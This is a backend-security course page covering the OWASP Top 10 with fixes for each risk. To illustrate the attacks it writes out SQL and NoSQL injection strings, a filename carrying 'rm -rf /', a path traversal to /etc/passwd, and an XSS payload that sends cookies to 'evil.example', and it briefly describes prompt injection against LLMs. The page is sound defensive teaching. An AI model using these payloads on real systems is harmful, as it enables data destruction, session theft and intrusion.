Backend Security & the OWASP Top 10

Authentication & Authorization Done Right covered getting identity and access decisions right by design — hashing, tokens, OAuth2, RBAC/ABAC. This page covers the rest of the threat model: what happens when a request carries a payload designed to make your code do something it was never meant to do, when a config file leaks something it shouldn't, or when an exception path silently does the unsafe thing. None of this is exotic. Almost every real breach traces back to one of a small, well-known set of mistakes, cataloged for two decades by the OWASP Top 10 — and the fixes are neither hard nor mysterious once you've internalized the pattern. What's hard is remembering to apply them everywhere, every time, because the attacker only needs one place you didn't.

A threat model, not a checklist

The mindset shift that matters more than any individual fix: stop asking "does this work for a well-behaved client" and start asking "what happens if the caller is actively hostile." Every input — a query string, a JSON body, a header, a filename, an uploaded file's content-type — is untrusted until your code proves otherwise. That includes input that looks internal: a service-to-service call, a message off a queue, a value read back out of your own database that started life as someone else's user input. Security bugs are almost always a missing "what if this isn't what I expect" branch, not a missing feature.

The OWASP Top 10, and where each risk lives in this course

OWASP refreshed the Top 10 for its 2025 edition, and the reshuffle is itself a useful signal of where real-world breaches have shifted: Security Misconfiguration jumped from #5 to #2, and two categories are new — Software Supply Chain Failures (dependency and build-pipeline compromise, broader than the old "vulnerable components" entry) and Mishandling of Exceptional Conditions (unsafe behavior on the error path). i Note

The Top 10 is a list of categories, ranked by prevalence and impact across tested applications — it's not exhaustive and it's not a spec. Treat it the way you'd treat a postmortem index: a curated list of the failure modes worth building habits and tooling around first, not the complete universe of things that can go wrong. A dedicated API-focused variant, the OWASP API Security Top 10, exists too and leads with the same access-control failures — Broken Object Level Authorization and Broken Function Level Authorization — because APIs expose object IDs directly far more often than server-rendered apps do.

Injection: never let untrusted input become code

An injection vulnerability happens whenever untrusted input gets concatenated into a command that a downstream interpreter — a SQL engine, a shell, an LDAP query, a NoSQL query language — then parses as syntax instead of treating purely as data. SQL injection is the canonical example because it's the one every backend engineer touches constantly:

VulnerableWhy it breaks
Query built by concatenation "SELECT * FROM users WHERE name = '" + input + "'" If input is ' OR '1'='1, the resulting string is a syntactically valid query whose WHERE clause is always true — the database has no way to know the closing quote came from an attacker, not your code.
Parameterized / prepared statement db.query("SELECT * FROM users WHERE name = ?", [input]) The query's structure is sent to the database and compiled first, with a placeholder for the value; input is bound afterward as a literal, no matter what characters it contains. There's no step where the database re-parses your data as syntax, so there's nothing for the attacker to break out of.
★ Insight

This is the same root cause named in the JWT algorithm-confusion bug from the previous page: letting untrusted input dictate how it gets interpreted. Parameterization doesn't "sanitize" the input at all — it removes the ambiguity entirely, by fixing the query's structure before the untrusted value is ever in play. That's a strictly stronger guarantee than any amount of escaping or filtering, which have to anticipate every dangerous character and context correctly, forever.

SQL is the most familiar case, but the same shape recurs anywhere untrusted input reaches an interpreter:

VariantVectorFix
NoSQL injectionA JSON body field like {"password": {"$ne": null}} passed straight into a MongoDB query operator instead of a literal valueValidate input shape/type before it reaches the query builder; never merge raw request bodies into query documents
OS command injectionexec("convert " + filename + " out.png") with a filename like a.jpg; rm -rf /Avoid shelling out to build commands from input at all; if unavoidable, use an API that passes arguments as an array (no shell parsing) rather than a single interpolated string
LDAP / XPath injectionSame pattern against a directory or XML query languageParameterized query APIs where the library supports them; strict allowlist validation otherwise
! Pitfall

An ORM does not make injection impossible — it makes the safe path the default path, which is different. User.where(name: input) is parameterized under the hood; User.where("name = '#{input}'") or a .raw() / .exec_query() escape hatch is exactly as vulnerable as hand-written concatenation, and every ORM has one of those escape hatches for the query the abstraction can't express. Code review should treat any raw/string-built query as an automatic flag, ORM or not.

Broken access control, beyond the object-level case

The previous page covered broken object-level authorization (IDOR) — a valid, authenticated user reaching a resource that isn't theirs because the endpoint never checked ownership. It remains the single most common access-control bug, and three close relatives round out the category:

PatternWhat goes wrong
Broken function-level authorizationA regular user calls POST /admin/users/promote directly — the endpoint checks "is there a valid token" but never "does this token's role permit this specific function." (Vertical privilege escalation: a low-privilege user reaches a high-privilege action, vs. IDOR's horizontal case of reaching a peer's data.)
Mass assignmentA request body like {"name": "Ann", "role": "admin"} gets bound directly onto a model with User.update(request.body). The endpoint only meant to let a user edit their name; because every field in the body is trusted, the attacker granted themselves a role nobody offered them the field to set.
Path traversalA file-download endpoint builds a path from user input, open("/uploads/" + filename), and never rejects a filename like ../../etc/passwd or an absolute path that escapes the intended directory entirely.

All three share the same fix shape as IDOR: don't trust the caller's framing of the request (which fields they included, which path they asked for) — explicitly allowlist what's permitted (which fields are bindable, which role can call this handler, which directory a resolved path must stay inside) and reject everything else.

Secrets and transport: the boring controls that matter most

Two controls are unglamorous, non-negotiable, and responsible for an outsized share of real incidents when skipped:

  • Secrets never live in code or config committed to version control — not an API key, not a DB password, not a signing secret, not "just for now." Inject them at runtime from environment variables or a secrets manager (Vault, AWS Secrets Manager, GCP Secret Manager), scope each secret's access as narrowly as the service that needs it, and rotate on a schedule rather than only after a suspected leak. A secret committed to git is compromised the moment it's pushed, even if the commit is later reverted — assume it's in every clone, fork, and CI log forever, and rotate it rather than hoping no one noticed.
  • Transport security everywhere, not just the public edge. TLS terminates client-to-load-balancer traffic in most designs (see Networking for Backend Engineers for the handshake mechanics), but internal service-to-service calls inside the same VPC are not automatically safe — anyone who compromises one host on that network can otherwise read or tamper with plaintext traffic between your services. Mutual TLS (mTLS) between services, enforced HSTS so a browser never silently downgrades to HTTP, and rejecting mixed content are the baseline, not a hardening extra.

Input validation and output encoding are two different jobs

It's tempting to treat "sanitize user input" as one step that makes data safe everywhere it's later used. It doesn't, because safe is context-dependent: the same string is dangerous in a SQL query, an HTML page, a shell command, and a URL for completely different reasons, and a filter written for one context routinely fails to protect the others.

Input validation
Runs once, at the boundary where data enters your system. Job: reject data that doesn't conform to what the field is supposed to hold — an email field should look like an email, a quantity should be a positive integer within a sane range. Prefer an allowlist ("only these characters/shapes are valid") over a denylist ("block these known-bad patterns") — a denylist has to anticipate every dangerous variant an attacker might try next; an allowlist just has to describe what's legitimately valid, which is usually a much smaller, more stable set.
Output encoding
Runs every time data is about to cross into a new interpreter — rendered into HTML, embedded in a <script> block, placed in a URL query string, written into a SQL query (where parameterization is the encoding). It must match the specific sink: HTML-body encoding, HTML-attribute encoding, and JavaScript-string encoding escape different characters, because each context's syntax is different.
! Pitfall

A filter that strips <script> tags from a comment field, then renders that comment into <div title="{{comment}}">, is still exploitable — cross-site scripting (XSS) here doesn't need a script tag at all: " onmouseover="fetch('//evil.example/steal?c='+document.cookie) breaks out of the attribute using nothing the input-time filter was looking for. The filter anticipated the wrong sink. The reliable fix is encoding at the render call, using an encoder matched to exactly where the data is going — most modern templating engines auto-escape for the HTML-body case by default; attribute contexts, inline JS, and raw innerHTML calls are where teams still get burned.

Rate limiting and abuse prevention

Not every hostile request is malformed — some are perfectly valid requests sent far too many times. A login endpoint with no rate limit is an open invitation to credential stuffing (replaying breached username/password pairs from other services) and brute force; a public search endpoint with no limit is an open invitation to scrape your entire dataset or run up your database bill. The standard defense is a token bucket or sliding-window counter per identity (API key, account, or IP as a fallback), returning 429 Too Many Requests with a Retry-After header once the budget is spent.

! Caution

Per-IP limiting alone is weaker than it looks: an attacker with a botnet or a rotating residential-proxy pool spreads requests across thousands of source IPs, each individually under the limit. Layer per-account/per-credential limits (which don't care how many IPs the attempts came from), CAPTCHA or step-up friction after a handful of failures, and — for login specifically — checking new credentials against known-breached-password lists before accepting them. This is a distinct problem from the resilience patterns covered earlier: circuit breakers and backoff protect you from a failing downstream dependency; rate limiting protects you from an abusive upstream caller — the traffic is the threat, not a symptom of something else being broken.

Security misconfiguration, supply chain, and the error path — the 2025 additions

Three categories that are easy to under-rate because none of them are a single dramatic bug — each is a class of small, cumulative gaps:

Security misconfiguration (A02)
Default credentials left enabled, verbose stack traces returned to the client in production (a gift-wrapped map of your framework version, file paths, and sometimes query text to an attacker), overly permissive CORS (Access-Control-Allow-Origin: * alongside credentialed requests), unnecessary admin interfaces or debug endpoints reachable from the public internet, and cloud storage buckets left world-readable. None of these are exotic exploits — they're checklist items that drift out of compliance as a system grows, which is exactly why it jumped to #2: it scales with surface area, not with attacker sophistication.
Software supply chain failures (A03)
Your service is only as trustworthy as every dependency it pulls in and every step of the pipeline that builds and ships it. A malicious or compromised package (the 2024 XZ Utils backdoor, inserted by a trusted-looking maintainer over years, is the reference case), a typosquatted package name, or a compromised CI runner can inject arbitrary code before your own review ever runs. Mitigations: pin exact dependency versions with a lockfile, generate and review a software bill of materials (SBOM), run automated vulnerability scanning on dependencies in CI, and treat build-pipeline credentials (the ones that can push a release) with the same access rigor as production database credentials.
Mishandling of exceptional conditions (A10)
What your code does when something goes wrong is itself a security decision. An authorization check wrapped in a try/catch that defaults to "allow" if the permission lookup throws is a textbook fail-open bug — the exact condition an attacker wants to trigger. An error handler that serializes the raw exception (including a database connection string or an internal hostname) into the HTTP response leaks internals for free. The governing rule: fail closed — on any exceptional condition where you're not certain the action is authorized, deny it and log the failure, rather than defaulting to whichever behavior was easiest to code.

It all comes back to least privilege

Nearly every fix on this page is a special case of one principle: give every identity — a user, a service account, a database role, a CI pipeline's deploy token — exactly the access it needs to do its job, and nothing more. A database user your app connects with should hold SELECT/INSERT/UPDATE on its own tables, not superuser; a service's cloud IAM role should reach the three resources it actually touches, not *; an API key for a read-only reporting integration should be structurally incapable of writing, even though nothing in today's code path would misuse that power. Least privilege doesn't prevent every bug, but it caps the blast radius of the ones that get through — a leaked read-only key or a compromised low-privilege service account is an incident; a leaked superuser credential is a headline.

★ ML-systems bridge

Every category above has a direct LLM/ML-systems analogue. Prompt injection — user or retrieved content containing instructions that override the system prompt — is structurally the same failure as SQL injection: untrusted content is being interpreted as instructions instead of data, because there's no hard boundary between the two in a raw text context; treating retrieved documents, tool outputs, and user messages as data to be reasoned about rather than commands to obey is the mitigation, imperfect as current techniques are. Model and dataset supply chain is A03 wearing an ML costume: a downloaded model checkpoint or training dataset from an unverified source is exactly as risky as an unpinned dependency — verify checksums, prefer signed artifacts, and know the provenance of anything you fine-tune on or serve. And a feature store that returns every computed feature to whichever service asks, rather than the subset that service's tenant and privacy tier are entitled to, is broken object-level authorization on feature data instead of order data — same bug, same fix: check what this caller may see, every time.

1. Why does a parameterized query stop SQL injection, when escaping quotes by hand often doesn't?

Escaping has to correctly anticipate every dangerous character for every possible context, forever. Parameterization sidesteps the whole problem — there's no step where your data gets re-parsed as commands, because the command was already fixed before the data arrived.

2. An app strips <script> tags from user comments on input, then later renders a comment into <div title="{{comment}}">. Why can this still be exploitable?

"Sanitize on input" and "encode on output" are different jobs. A filter tuned for the HTML-body case doesn't protect an HTML-attribute sink, which has a different breakout syntax (closing the attribute's quote, not opening a tag). Encode at the render call, matched to that exact sink.

3. A login endpoint has no rate limiting. What's it most exposed to, and why doesn't a simple per-IP limit fully solve it?

Rate limiting defends against an abusive caller, not a failing dependency — that's the resilience-pattern circuit breaker's job. A determined credential-stuffing attacker distributes requests across enough source IPs that per-IP limiting alone barely slows them down; per-account/per-credential limits and known-breached-password checks close the gap.
